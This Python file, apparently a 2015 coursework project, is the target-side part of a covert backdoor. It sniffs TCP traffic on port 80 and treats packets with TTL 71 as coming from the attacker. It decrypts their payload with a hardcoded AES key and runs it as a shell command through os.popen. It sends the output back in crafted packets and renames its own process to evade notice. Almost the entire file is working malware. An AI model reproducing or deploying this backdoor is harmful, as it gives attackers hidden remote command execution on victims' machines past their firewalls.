'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    target.py
--
--  AUTHOR:         Thilina Ratnayake
--
--  PROGRAM:        Covert back-door that upon running, masks process name and
--                  listens for commands from an attacker on raw sockets
--                  to circumvent the firewall.
--
--  FUNCTIONS:      decryptCommand(string)
--                  receivedPacket(packet)
--                  encryptCommand(string)
--                  commandResult(packet)
--
--  DATE:           October 17, 2015
--
--  REVISIONS:
--
--  NOTES:
--  The program requires the PyCrypto and Scapy libraries for encryption and packet
--  crafting respectively.
--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import os
from Crypto.Cipher import AES
import setproctitle
import subprocess

global clientIP
global listening



'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       decryptCommand
--  Parameters:
--     String
--      The encrypted command contained in the packet payload.
--  Return Values:
--      String
--          The decrypted plain text command contained in the packet payload.
--  Description:
--      The function takes the encrypted command contained in the packet payload
--      and decrypts is using the same key and IV used at the attackers system.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def decryptCommand(command):
    decryptor = AES.new("0123456789abcdef", AES.MODE_CFB, IV="abcdefghijklmnop")
    plain = decryptor.decrypt(command)
    return plain

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       receivedPacket
--  Parameters:
--     String
--      The encrypted command contained in the packet payload.
--  Return Values:
--      String
--          The decrypted plain text command contained in the packet payload.
--  Description:
--      The function takes the encrypted command contained in the packet payload
--      and decrypts is using the same key and IV used at the attackers system.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def receivedPacket(packet):
    if IP in packet[0]:
        #Authenticate that the packets are actually from the attacker
        # Key is TTL 71
        if packet[IP].ttl ==71:
            srcIP = packet[IP].src
            srcPort = packet[TCP].sport
            command = decryptCommand(packet["Raw"].load)
            #Execute the command
            f = os.popen(command)
            result = f.read()
            if result == "":
                result = "No Output Produced"
            newPacket = (IP(dst=srcIP, ttl=71)/TCP(sport=80, dport=srcPort)/result)
            send(newPacket, verbose = False)
            return True
        else:
            return False


if __name__ == "__main__":
    #Set process title to something less suspicious
    setproctitle.setproctitle("Non-suspicious-program")

    #Listen for connections
    listening = True;
    while listening:
        sniff(filter='tcp and dst port 80', stop_filter=receivedPacket)
